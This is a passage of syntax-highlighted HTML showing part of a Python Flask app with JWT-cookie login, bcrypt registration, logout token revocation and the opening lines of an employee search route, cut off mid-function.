</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">89</span><span class="">            flash</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid token!&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">90</span><span class="">            </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">91</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">92</span><span class="">        </span><span class="token keyword">return</span><span class=""> f</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="">args</span><span class="token punctuation">,</span><span class=""> </span><span class="token operator">**</span><span class="">kwargs</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">93</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">94</span><span class="">    </span><span class="token keyword">return</span><span class=""> decorated
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">95</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">96</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">97</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">98</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">99</span><span class="">    token </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">cookies</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;JWT&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">100</span><span class="">    </span><span class="token keyword">if</span><span class=""> token </span><span class="token keyword">is</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">101</span><span class="">        </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">102</span><span class="">    </span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">103</span><span class="">        </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/employees&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">104</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">105</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">106</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/register&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">107</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">108</span><span class="">    </span><span class="token keyword">if</span><span class=""> request</span><span class="token punctuation">.</span><span class="">method </span><span class="token operator">==</span><span class=""> </span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">109</span><span class="">        </span><span class="token keyword">return</span><span class=""> render_template</span><span class="token punctuation">(</span><span class="token string">&quot;register.html&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">110</span><span class="">    </span><span class="token keyword">elif</span><span class=""> request</span><span class="token punctuation">.</span><span class="">method </span><span class="token operator">==</span><span class=""> </span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">111</span><span class="">        data </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">form
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">112</span><span class="">        username </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">113</span><span class="">        password </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;password&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">114</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">115</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> username </span><span class="token keyword">or</span><span class=""> </span><span class="token keyword">not</span><span class=""> password</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">116</span><span class="">            </span><span class="token keyword">return</span><span class=""> jsonify</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;Username and password required!&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">400</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">117</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">118</span><span class="">        password_hash </span><span class="token operator">=</span><span class=""> bcrypt</span><span class="token punctuation">.</span><span class="">hashpw</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">119</span><span class="">            password</span><span class="token punctuation">.</span><span class="">encode</span><span class="token punctuation">(</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> bcrypt</span><span class="token punctuation">.</span><span class="">gensalt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">120</span><span class="">        </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">decode</span><span class="token punctuation">(</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">121</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">122</span><span class="">        conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">123</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">124</span><span class="">            conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">125</span><span class="">                </span><span class="token string">&quot;INSERT INTO users (username, is_admin, password_hash) VALUES (?, ?, ?)&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">126</span><span class="">                </span><span class="token punctuation">(</span><span class="">username</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">False</span><span class="token punctuation">,</span><span class=""> password_hash</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">127</span><span class="">            </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">128</span><span class="">            conn</span><span class="token punctuation">.</span><span class="">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">129</span><span class="">        </span><span class="token keyword">except</span><span class=""> sqlite3</span><span class="token punctuation">.</span><span class="">IntegrityError</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">130</span><span class="">            flash</span><span class="token punctuation">(</span><span class="token string">&quot;User already exists.&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">131</span><span class="">            </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/register&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">132</span><span class="">        </span><span class="token keyword">finally</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">133</span><span class="">            conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">134</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">135</span><span class="">        flash</span><span class="token punctuation">(</span><span class="token string">&quot;User created successfully.&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;success&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">136</span><span class="">        </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">137</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">138</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">139</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">140</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">141</span><span class="">    </span><span class="token keyword">if</span><span class=""> request</span><span class="token punctuation">.</span><span class="">method </span><span class="token operator">==</span><span class=""> </span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">142</span><span class="">        </span><span class="token keyword">return</span><span class=""> render_template</span><span class="token punctuation">(</span><span class="token string">&quot;login.html&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">143</span><span class="">    </span><span class="token keyword">elif</span><span class=""> request</span><span class="token punctuation">.</span><span class="">method </span><span class="token operator">==</span><span class=""> </span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">144</span><span class="">        data </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">form
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">145</span><span class="">        username </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">146</span><span class="">        password </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;password&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">147</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">148</span><span class="">        conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">149</span><span class="">        user </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">150</span><span class="">            </span><span class="token string">&quot;SELECT * FROM users WHERE username = ?&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="">username</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">151</span><span class="">        </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">fetchone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">152</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">153</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">154</span><span class="">        </span><span class="token keyword">if</span><span class=""> user </span><span class="token keyword">and</span><span class=""> bcrypt</span><span class="token punctuation">.</span><span class="">checkpw</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">155</span><span class="">            password</span><span class="token punctuation">.</span><span class="">encode</span><span class="token punctuation">(</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> user</span><span class="token punctuation">[</span><span class="token string">&quot;password_hash&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="">encode</span><span class="token punctuation">(</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">156</span><span class="">        </span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">157</span><span class="">            token </span><span class="token operator">=</span><span class=""> jwt</span><span class="token punctuation">.</span><span class="">encode</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">158</span><span class="">                </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">159</span><span class="">                    </span><span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span><span class=""> username</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">160</span><span class="">                    </span><span class="token string">&quot;is_admin&quot;</span><span class="token punctuation">:</span><span class=""> user</span><span class="token punctuation">[</span><span class="token string">&quot;is_admin&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">161</span><span class="">                    </span><span class="token string">&quot;issued&quot;</span><span class="token punctuation">:</span><span class=""> time</span><span class="token punctuation">.</span><span class="">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">162</span><span class="">                </span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">163</span><span class="">                app</span><span class="token punctuation">.</span><span class="">config</span><span class="token punctuation">[</span><span class="token string">&quot;SECRET_KEY&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">164</span><span class="">                algorithm</span><span class="token operator">=</span><span class="token string">&quot;HS256&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">165</span><span class="">            </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">166</span><span class="">            resp </span><span class="token operator">=</span><span class=""> make_response</span><span class="token punctuation">(</span><span class="">redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/employees&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">167</span><span class="">            resp</span><span class="token punctuation">.</span><span class="">set_cookie</span><span class="token punctuation">(</span><span class="token string">&quot;JWT&quot;</span><span class="token punctuation">,</span><span class=""> token</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">168</span><span class="">            </span><span class="token keyword">return</span><span class=""> resp
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">169</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">170</span><span class="">        flash</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid credentials.&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">171</span><span class="">        </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">172</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">173</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">174</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/logout&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">175</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">176</span><span class="">    token </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">cookies</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;JWT&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">177</span><span class="">    </span><span class="token keyword">if</span><span class=""> token</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">178</span><span class="">        conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">179</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="token string">&quot;INSERT INTO revoked_tokens (token) VALUES (?)&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="">token</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">180</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">181</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">182</span><span class="">    resp </span><span class="token operator">=</span><span class=""> make_response</span><span class="token punctuation">(</span><span class="">redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">183</span><span class="">    resp</span><span class="token punctuation">.</span><span class="">delete_cookie</span><span class="token punctuation">(</span><span class="token string">&quot;JWT&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">184</span><span class="">    </span><span class="token keyword">return</span><span class=""> resp
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">185</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">186</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">187</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/employees&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">188</span><span class=""></span><span class="token decorator annotation punctuation">@token_required</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">189</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">employees</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">190</span><span class="">    query </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">args</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;query&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">191</span><span class="">    conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">192</span><span class="">    cursor </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">cursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
